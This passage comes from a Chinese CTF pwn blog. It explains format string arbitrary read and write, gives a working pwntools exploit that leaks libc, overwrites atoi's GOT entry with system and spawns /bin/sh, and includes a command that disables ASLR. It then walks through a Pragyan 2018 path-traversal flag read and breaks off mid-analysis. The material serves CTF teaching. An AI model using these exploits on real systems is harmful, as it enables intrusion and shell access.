title="任意地址读"></a>任意地址读</h3><p>事实上，我们在scanf(或者read)来输入字符串的时候，字符串就已经在栈中了，如图，可以看出偏移为6。如果我们构造出<code>addr(4字节)%6$s</code>，就能读取这个地址的值了。<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-03-05-142854.jpg" alt=""><br>我们尝试一下，输入<code>AAAA%6$s</code>，当然不可能真的读到地址为41414141的内存值，不过从下图我框起来的内容就知道，如果我们输入一个合法的值，就可以读了。<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-03-05-142934.jpg" alt=""></p><h3 id="任意地址写"><a href="#任意地址写" class="headerlink" title="任意地址写"></a>任意地址写</h3><p>和上面的任意地址读是同理的，只不过利用了格式化字符串的一个比较冷门的特性，%n。<br>这个占位符可以把它前面输出的字符的数量，写入指定的地址。<br>比如<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">printf</span>(<span class="string">"abc%n"</span>, &amp;val);</span><br></pre></td></tr></table></figure></p><p>val的值就被改变为3。</p><h3 id="pwntools"><a href="#pwntools" class="headerlink" title="pwntools"></a>pwntools</h3><h4 id="fmtstr"><a href="#fmtstr" class="headerlink" title="fmtstr"></a><a href="http://pwntools.readthedocs.io/en/stable/fmtstr.html" target="_blank" rel="noopener">fmtstr</a></h4><p>上面说过我们要利用格式化串漏洞就要得到格式化串的偏移,pwntools有自动化代码可以得到这个偏移。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exec_fmt</span><span class="params">(payload)</span>:</span></span><br><span class="line">    p = process(program)</span><br><span class="line">    p.sendline(payload)</span><br><span class="line">    info = p.recv()</span><br><span class="line">    p.close()</span><br><span class="line">    <span class="keyword">return</span> info</span><br><span class="line"></span><br><span class="line">autofmt = FmtStr(exec_fmt)</span><br><span class="line"><span class="keyword">print</span> autofmt.offset</span><br></pre></td></tr></table></figure></p><h4 id="fmtstr-payload"><a href="#fmtstr-payload" class="headerlink" title="fmtstr_payload"></a>fmtstr_payload</h4><p>生成任意地址写的payload的函数.<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fmtstr_payload(offset, &#123;key: value&#125;)</span><br></pre></td></tr></table></figure></p><p>fmtstr_payload有两个参数</p><ul><li>第一个参数是int，用于表示取参数的偏移个数</li><li>第二个参数是字典，字典的意义是往key的地址，写入value的值</li></ul><h2 id="赛题链接"><a href="#赛题链接" class="headerlink" title="赛题链接"></a>赛题链接</h2><p><a href="https://github.com/eternalsakura/ctf_pwn/tree/master/湖湘杯2017/pwn200" target="_blank" rel="noopener">https://github.com/eternalsakura/ctf_pwn/tree/master/湖湘杯2017/pwn200</a></p><h2 id="打开IDA跟入调试"><a href="#打开IDA跟入调试" class="headerlink" title="打开IDA跟入调试"></a>打开IDA跟入调试</h2><p><img src="https://ws1.sinaimg.cn/large/006tNc79ly1fnq89d4w5qj30m40biabl.jpg" alt=""><br><img src="https://ws2.sinaimg.cn/large/006tNc79ly1fnq88fzh3pj30w00r8afi.jpg" alt=""><br>形如<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">char buf[100]</span><br><span class="line">scanf(&quot;%s&quot;,buf);</span><br><span class="line">printf(buf);</span><br></pre></td></tr></table></figure></p><p><strong>找到格式化字符串漏洞</strong></p><h2 id="利用漏洞"><a href="#利用漏洞" class="headerlink" title="利用漏洞"></a>利用漏洞</h2><h3 id="checksec查看保护"><a href="#checksec查看保护" class="headerlink" title="checksec查看保护"></a>checksec查看保护</h3><p><img src="https://ws2.sinaimg.cn/large/006tNc79ly1fnq8hv6sgdj30i8080jsr.jpg" alt=""><br><strong>tips1</strong><br>查看本机ASLR<br><img src="https://ws1.sinaimg.cn/large/006tNc79ly1fnq8kg22vwj30kb06smze.jpg" alt=""><br>so地址变动，确定本机开启了aslr<br>关闭ASLR<br><code>echo 0 &gt; /proc/sys/kernel/randomize_va_space</code><br>确认关闭<br><img src="https://ws3.sinaimg.cn/large/006tNc79ly1fnq8nmhuy3j30jc067gmz.jpg" alt=""></p><h3 id="利用思路"><a href="#利用思路" class="headerlink" title="利用思路"></a>利用思路</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">printf(&amp;buf);</span><br><span class="line">puts(&quot;GET YOUR AGE:\n&quot;);</span><br><span class="line">read(0, &amp;buf, 0x40u);</span><br><span class="line">if ( atoi(&amp;buf) &gt; 60 )</span><br><span class="line">  puts(&quot;OLD MEN!\n&quot;);</span><br></pre></td></tr></table></figure><p>看到printf(&amp;buf)之后<br>read(buf)<br>atoi(buf)<br>所以我们的思路就是，<strong>利用格式化字符串漏洞的任意地址读，先leak出puts函数的地址puts_addr<br>到利用格式化字符串漏洞的任意地址写，去将atoi函数在got.plt表中的地址改为system函数的地址，然后通过read去控制buf，传入”/bin/sh”，构造出system(“bin/sh”),获取shell</strong>。<br>关于覆盖got表，不知道为什么的话，参考下面的文章。<br><a href="https://www.jianshu.com/p/0ac63c3744dd" target="_blank" rel="noopener">https://www.jianshu.com/p/0ac63c3744dd</a><br><a href="http://rickgray.me/use-gdb-to-study-got-and-plt" target="_blank" rel="noopener">http://rickgray.me/use-gdb-to-study-got-and-plt</a></p><h3 id="leak出puts函数的地址"><a href="#leak出puts函数的地址" class="headerlink" title="leak出puts函数的地址"></a>leak出puts函数的地址</h3><p>任意地址读：<a href="https://ctf-wiki.github.io/ctf-wiki/pwn/fmtstr/fmtstr_exploit.html" target="_blank" rel="noopener">https://ctf-wiki.github.io/ctf-wiki/pwn/fmtstr/fmtstr_exploit.html</a><br>调试找到puts的地址在栈中的位置。<br><img src="https://ws1.sinaimg.cn/large/006tNc79ly1fnqg75wqhuj31bo0yen3e.jpg" alt=""><br>在gdb中调试（这里我使用了gef插件），可以看出地址在7个参数（仔细分析一下<code>AAAA%7$x</code>，把AAAA换掉就是地址，把%x换成%s就可以打印出内容)</p><h3 id="计算system地址"><a href="#计算system地址" class="headerlink" title="计算system地址"></a>计算system地址</h3><p><code>libc.symbols[&#39;system&#39;] - libc.symbols[&#39;puts&#39;] + u32(puts_addr)</code></p><h3 id="覆盖got表中atoi的内容为system地址"><a href="#覆盖got表中atoi的内容为system地址" class="headerlink" title="覆盖got表中atoi的内容为system地址"></a>覆盖got表中atoi的内容为system地址</h3><h4 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">printf(&quot;abc%nabc\n&quot;, &amp;val);</span><br><span class="line">printf(&quot;val = %d\n&quot;, val);</span><br></pre></td></tr></table></figure><p>输出为<br>abcabc<br>val = 3<br>这就告诉我们，%n可以把其前面输出的字符个数，写入&amp;val指向的地址。<br>如果还不理解的话可以参考：<br><a href="https://ctf-wiki.github.io/ctf-wiki/pwn/fmtstr/fmtstr_exploit.html" target="_blank" rel="noopener">https://ctf-wiki.github.io/ctf-wiki/pwn/fmtstr/fmtstr_exploit.html</a><br><a href="http://www.cnblogs.com/Ox9A82/p/5429099.html" target="_blank" rel="noopener">http://www.cnblogs.com/Ox9A82/p/5429099.html</a></p><p>之前我们已经调试过了”AAAA”就在第7个参数，所以只需构造{addr}{适当的写入值}{<code>%7$n</code>}即可。<br>这里pwntools提供了fmtstr_payload函数来自动生成格式化串。<br>fmtstr_payload(参数偏移,{xxx_got_addr: system_addr})</p><h3 id="getshell"><a href="#getshell" class="headerlink" title="getshell"></a>getshell</h3><p><img src="https://ws3.sinaimg.cn/large/006tNc79ly1fnqhotz7ahj30d708mdh6.jpg" alt=""></p><h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"># coding:utf-8</span><br><span class="line">from pwn import *</span><br><span class="line">elf = ELF(&apos;pwne&apos;)</span><br><span class="line"># conn=remote(&apos;ip&apos;,port)</span><br><span class="line">libc = ELF(&apos;/lib/i386-linux-gnu/libc.so.6&apos;)</span><br><span class="line"># libc=ELF(&apos;libc.so.6&apos;)</span><br><span class="line">p = process(&apos;./pwne&apos;)</span><br><span class="line">p.recvuntil(&apos;[Y/N]\n&apos;)</span><br><span class="line">p.sendline(&apos;Y&apos;)</span><br><span class="line">p.recvuntil(&apos;NAME:\n\n&apos;)</span><br><span class="line">p.sendline(p32(elf.got[&apos;puts&apos;]) + &apos;%7$s&apos;)</span><br><span class="line">p.recvuntil(&apos;WELCOME \n&apos;)</span><br><span class="line">puts_addr=p.recv()[4:8]</span><br><span class="line"># print u32(put_addr)</span><br><span class="line">system_addr = libc.symbols[&apos;system&apos;] - libc.symbols[&apos;puts&apos;] + u32(puts_addr)</span><br><span class="line">atoi_got_addr = elf.got[&apos;atoi&apos;]</span><br><span class="line">p.sendline(&apos;17&apos;)</span><br><span class="line">p.recvuntil(&apos;[Y/N]\n&apos;)</span><br><span class="line">p.sendline(&apos;Y&apos;)</span><br><span class="line">p.recvuntil(&apos;NAME:\n\n&apos;)</span><br><span class="line">p.sendline(fmtstr_payload(7, &#123;atoi_got_addr: system_addr&#125;))</span><br><span class="line">p.recvuntil(&apos;GET YOUR AGE:\n\n&apos;)</span><br><span class="line">p.sendline(&apos;/bin/sh\x00&apos;)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>]]></content>
      
      <categories>
          
          <category> CTF </category>
          
          <category> pwn </category>
          
          <category> 格式化字符串 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 格式化字符串 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>pragyan ctf2018 pwn writeup</title>
      <link href="/2018/03/05/pragyan/"/>
      <url>/2018/03/05/pragyan/</url>
      <content type="html"><![CDATA[<h1 id="Old-school-hack-200pts"><a href="#Old-school-hack-200pts" class="headerlink" title="Old school hack (200pts)"></a>Old school hack (200pts)</h1><h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><h3 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Chris is trying out to be a police officer and the applications have just been sent into the police academy.</span><br><span class="line">He is really eager to find out about his competition. </span><br><span class="line">Help it him back the system and view the other applicant’s applications.</span><br><span class="line"></span><br><span class="line">The service is running at 128.199.224.175:13000</span><br><span class="line"></span><br><span class="line">Hint! Path Traversals are always a classic.</span><br></pre></td></tr></table></figure><h3 id="题目链接："><a href="#题目链接：" class="headerlink" title="题目链接："></a>题目链接：</h3><p><a href="https://github.com/eternalsakura/ctf_pwn/blob/master/pragyan2018/police_academy" target="_blank" rel="noopener">https://github.com/eternalsakura/ctf_pwn/blob/master/pragyan2018/police_academy</a></p><h2 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h2><h3 id="scanf变量覆盖"><a href="#scanf变量覆盖" class="headerlink" title="scanf变量覆盖"></a>scanf变量覆盖</h3><p>程序举例<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> a,b;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"input character a,b\n"</span>);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">"%s"</span>,&amp;a);<span class="comment">//bug</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"%c%c\n"</span>,a,b);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>输出结果<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AA</span><br></pre></td></tr></table></figure></p><p><strong>简单调试</strong><br>编译程序<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc test.c -g -o test</span><br></pre></td></tr></table></figure></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">sakura@ubuntu:~$ gdb test</span><br><span class="line">Loaded 112 commands. Type pwndbg [filter] for a list.</span><br><span class="line">Reading symbols from test...done.</span><br><span class="line">pwndbg&gt; b 5</span><br><span class="line">Breakpoint 1 at 0x4005ff: file test.c, line 5.</span><br><span class="line">pwndbg&gt; r</span><br><span class="line">Starting program: /home/sakura/test </span><br><span class="line">input character a,b</span><br><span class="line">...</span><br><span class="line">pwndbg&gt; n</span><br><span class="line">AAAA</span><br><span class="line">6    printf(&quot;%c%c\n&quot;,a,b);</span><br><span class="line">...</span><br><span class="line">pwndbg&gt; p a</span><br><span class="line">$1 = 65 &apos;A&apos;</span><br><span class="line">pwndbg&gt; p b</span><br><span class="line">$2 = 65 &apos;A&apos;</span><br><span class="line">pwndbg&gt; c</span><br><span class="line">Continuing.</span><br><span class="line">AA</span><br></pre></td></tr></table></figure><p>可以看出函数里本来应该只对a赋值。<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">scanf</span>(<span class="string">"%s"</span>,&amp;a)</span><br></pre></td></tr></table></figure></p><p>但是b的值也被覆盖为A了，这里其实就可以栈溢出，但是在本题中只需要覆盖栈内变量即可。</p><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><h3 id="checksec"><a href="#checksec" class="headerlink" title="checksec"></a>checksec</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">sakura@ubuntu:~$ checksec police_academy </span><br><span class="line">[*] &apos;/home/sakura/police_academy&apos;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x400000)</span><br><span class="line">sakura@ubuntu:~$</span><br></pre></td></tr></table></figure><p>64位程序,canary,NX保护</p><h3 id="输入密码"><a href="#输入密码" class="headerlink" title="输入密码"></a>输入密码</h3><p>密码被硬编码进程序,即kaiokenx20<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( <span class="built_in">strncmp</span>(&amp;s1, <span class="string">"kaiokenx20"</span>, <span class="number">10u</span>LL) )</span><br></pre></td></tr></table></figure></p><h3 id="栈溢出"><a href="#栈溢出" class="headerlink" title="栈溢出"></a>栈溢出</h3><p><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-03-05-131332.png" alt=""></p><h3 id="文件读取函数"><a href="#文件读取函数" class="headerlink" title="文件读取函数"></a>文件读取函数</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"> __int64 v8; <span class="comment">// [rsp+20h] [rbp-30h]</span></span><br><span class="line"> ...</span><br><span class="line"> v6 = print_record((<span class="keyword">const</span> <span class="keyword">char</span> *)&amp;v8);</span><br><span class="line"></span><br><span class="line"> <span class="keyword">signed</span> __int64 __<span class="function">fastcall <span class="title">print_record</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  FILE *stream; <span class="comment">// [rsp+18h] [rbp-338h]</span></span><br><span class="line">  <span class="keyword">char</span> ptr; <span class="comment">// [rsp+20h] [rbp-330h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v4; <span class="comment">// [rsp+348h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v4 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="keyword">if</span> ( (<span class="keyword">unsigned</span> <span class="keyword">int</span>)<span class="built_in">strlen</span>(a1) != <span class="number">36</span> )         <span class="comment">// 文件名要等于36字节</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0xFFFFFFFF</span>LL;</span><br><span class="line">  stream = fopen(a1, <span class="string">"r"</span>);</span><br><span class="line">  <span class="keyword">if</span> ( !stream )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0xFFFFFFFF</span>LL;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"\nXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX"</span>, <span class="string">"r"</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"\nXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX\n"</span>);</span><br><span class="line">  fread(&amp;ptr, <span class="number">0x30C</span>uLL, <span class="number">1u</span>LL, stream);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"%s"</span>, &amp;ptr);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"\n\nXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX"</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"\nXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX"</span>);</span><br><span class="line">  fclose(stream);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0L</span>L;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这个函数的作用就是根据文件名读取文件，这个文件名本来是根据我们的选项(1-7)来决定的，比如如果是7，则v8 = ‘txt.galf’。<br>但是可以看出，如果我们输入的数在1-7之外，那么就不会对v8赋值，如果我们通过前面的scanf直接把v8的值覆盖成我们想要读取的文件名(flag.txt)，那么就可以读取到flag了。<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line">__isoc99_scanf(<span class="string">"%d"</span>, &amp;v5);</span><br><span class="line">  <span class="keyword">switch</span> ( v5 )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">      v8 = <span class="number">3474298655558951218L</span>L;</span><br><span class="line">      v9 = <span class="number">3847821640488804656L</span>L;</span><br><span class="line">      v10 = <span class="number">7149858464072819505L</span>L;</span><br><span class="line">      v11 = <span class="number">7221017546570621237L</span>L;</span><br><span class="line">      v12 = <span class="number">1952539694</span>;</span><br><span class="line">      v13 = <span class="number">0</span>;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">      v8 = <span class="number">7147605565415700579L</span>L;</span><br><span class="line">      v9 = <span class="number">3631416849257871156L</span>L;</span><br><span class="line">      v10 = <span class="number">4121973650644951905L</span>L;</span><br><span class="line">      v3 = (<span class="keyword">int</span> *)<span class="number">4049125503535429937L</span>L;</span><br><span class="line">      v11 = <span class="number">4049125503535429937L</span>L;</span><br><span class="line">      v12 = <span class="number">1952539694</span>;</span><br><span class="line">      v13 = <span class="number">0</span>;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">      v8 = <span class="number">0x3233613163393238</span>LL;</span><br><span class="line">      v9 = <span class="number">3702634411308757558L</span>L;</span><br><span class="line">      v3 = (<span class="keyword">int</span> *)<span class="number">7076898166606619443L</span>L;</span><br><span class="line">      v10 = <span class="number">7076898166606619443L</span>L;</span><br><span class="line">      v11 = <span class="number">7219893850032333154L</span>L;</span><br><span class="line">      v12 = <span class="number">1952539694</span>;</span><br><span class="line">      v13 = <span class="number">0</span>;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">4</span>:</span><br><span class="line">      v8 = <span class="number">7221577417837786465L</span>L;</span><br><span class="line">      v3 = (<span class="keyword">int</span> *)<span class="number">7363447393777498210L</span>L;</span><br><span class="line">      v9 = <span class="number">7363447393777498210L</span>L;</span><br><span class="line">      v10 = <span class="number">7017788206782754871L</span>L;</span><br><span class="line">      v11 = '06491899';</span><br><span class="line">      v12 = 'tad.';</span><br><span class="line">      v13 = <span class="number">0</span>;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">5</span>:</span><br><span class="line">      v8 = 'cb7eb354';</span><br><span class="line">      v9 = <span class="number">7147275711155430960L</span>L;</span><br><span class="line">      v10 = <span class="number">7076672766706148656L</span>L;</span><br><span class="line">      v3 = (<span class="keyword">int</span> *)<span class="number">3486685753473249589L</span>L;</span><br><span class="line">      v11 = <span class="number">3486685753473249589L</span>L;</span><br><span class="line">      v12 = <span class="number">1952539694</span>;</span><br><span class="line">      v13 = <span class="number">0</span>;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">6</span>:</span><br><span class="line">      v8 = <span class="number">0331433146246314630463L</span>L;</span><br><span class="line">      v9 = 'b5d57a29';</span><br><span class="line">      v3 = (int *)'a7e6a65d';</span><br><span class="line">      v10 = 'a7e6a65d';</span><br><span class="line">      v11 = 'c721627f';</span><br><span class="line">      v12 = 'tad.';</span><br><span class="line">      v13 = <span class="number">0</span>;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">7</span>:</span><br><span class="line">      v8 = 'txt.galf';</span><br><span class="line">      LOBYTE(v9) = <span class="number">0</span>;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">"You don't have the required privileges to view the flag, yet."</span>);</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">      <span class="keyword">return</span> result;</span><br><span class="line">    <span class="keyword">default</span>:</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure></p><h3 id="长度校验"><a href="#长度校验" class="headerlink" title="长度校验"></a>长度校验</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( (<span class="keyword">unsigned</span> <span class="keyword">int</span>)<span class="built_in">strlen</span>(a1) != <span class="number">36</span> ) </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0xFFFFFFFF</span>LL;</span><br></pre></td></tr></table></figure><p>因为我们提供的v8的文件名要等于36字节，但是flag.txt没有那么长，所以这里，我们可以<strong>用./././..来填充。</strong></p><h2 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h2><h3 id="利用思路"><a href="#利用思路" class="headerlink" title="利用思路"></a>利用思路</h3><p>首先用scanf覆盖是s1的值为密码（kaiokenx20）+padding,覆盖v8的值为././././././././././././././flag.txt，然后读取flag。</p><h3 id="确定填充值"><a href="#确定填充值" class="headerlink" title="确定填充值"></a>确定填充值</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">char s1; // [rsp+10h] [rbp-40h]</span><br><span class="line">__int64 v8; // [rsp+20h] [rbp-30h]</span><br><span class="line">...</span><br><span class="line">...</span><br><span class="line">...</span><br><span class="line"> __isoc99_scanf(&quot;%s&quot;, &amp;s1);</span><br><span class="line"> ...</span><br><span class="line"> ...</span><br><span class="line"> ...</span><br><span class="line">-0000000000000040 s1              db ?</span><br><span class="line">-000000000000003F                 db ? ; undefined</span><br><span class="line">-000000000000003E                 db ? ; undefined</span><br><span class="line">-000000000000003D                 db ? ; undefined</span><br><span class="line">-000000000000003C                 db ? ; undefined</span><br><span class="line">-000000000000003B                 db ? ; undefined</span><br><span class="line">-000000000000003A                 db ? ; undefined</span><br><span class="line">-0000000000000039                 db ? ; undefined</span><br><span class="line">-0000000000000038                 db ? ; undefined</span><br><span class="line">-0000000000000037                 db ? ; undefined</span><br><span class="line">-0000000000000036                 db ? ; undefined</span><br><span class="line">-0000000000000035                 db ? ; undefined</span><br><span class="line">-0000000000000034                 db ? ; undefined</span><br><span class="line">-0000000000000033                 db ? ; undefined</span><br><span class="line">-0000000000000032                 db ? ; undefined</span><br><span class="line">-0000000000000031                 db ? ; undefined</span><br><span class="line">-0000000000000030 var_30          dq ?</span><br><span class="line">-0000000000000028 anonymous_0     dq ?</span><br><span class="line">-0000000000000020 anonymous_1     dq ?</span><br><span class="line">-0000000000000018 anonymous_2     dq 